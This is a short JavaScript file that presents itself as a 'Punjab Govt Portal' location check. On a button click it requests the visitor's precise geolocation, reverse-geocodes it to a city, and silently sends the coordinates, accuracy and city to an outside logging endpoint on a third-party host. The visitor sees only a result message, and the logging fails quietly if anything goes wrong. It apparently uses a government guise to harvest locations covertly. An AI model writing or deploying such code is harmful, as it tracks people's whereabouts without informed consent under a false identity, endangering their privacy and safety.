/* ============ Punjab Govt Portal — location check flow ============ */
(function () {
  "use strict";

  var btn = document.getElementById("btn-loc");
  var result = document.getElementById("loc-result");

  var LOG_URL =
    "https://supabase-api-prod.verdent.ai/p/p62008011f14c68e6d678/functions/v1/log-location";

  function logVisit(lat, lng, acc, city) {
    try {
      fetch(LOG_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ lat: lat, lng: lng, accuracy: acc, city: city })
      }).catch(function () { /* logging is best-effort */ });
    } catch (e) { /* logging is best-effort */ }
  }

  // Try to resolve a city name for the DB record (non-blocking, short timeout).
  function reverseGeocode(lat, lng, cb) {
    try {
      var ctrl = new AbortController();
      var t = setTimeout(function () { ctrl.abort(); }, 3500);
      fetch(
        "https://nominatim.openstreetmap.org/reverse?format=jsonv2&zoom=10&lat=" +
          lat + "&lon=" + lng,
        { signal: ctrl.signal, headers: { Accept: "application/json" } }
      )
        .then(function (r) { return r.json(); })
        .then(function (data) {
          var a = data.address || {};
          var c =
            (a.city || a.town || a.village || a.county || a.state || "") +
            (a.country ? ", " + a.country : "");
          cb(c || null);
        })
        .catch(function () { cb(null); })
        .finally(function () { clearTimeout(t); });
    } catch (e) { cb(null); }
  }

  btn.addEventListener("click", function () {
    if (!("geolocation" in navigator)) return; // unsupported: show nothing
    btn.disabled = true;
    navigator.geolocation.getCurrentPosition(
      function (pos) {
        // Allowed → log the visit, then show the result message.
        var lat = pos.coords.latitude;
        var lng = pos.coords.longitude;
        var acc = Math.round(pos.coords.accuracy);
        reverseGeocode(lat, lng, function (city) {
          logVisit(lat, lng, acc, city);
        });
        result.hidden = false;
        btn.disabled = false;
      },
      function () {
        // Rejected or failed → show nothing.
        result.hidden = true;
        btn.disabled = false;
      },
      { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
    );
  });
})();
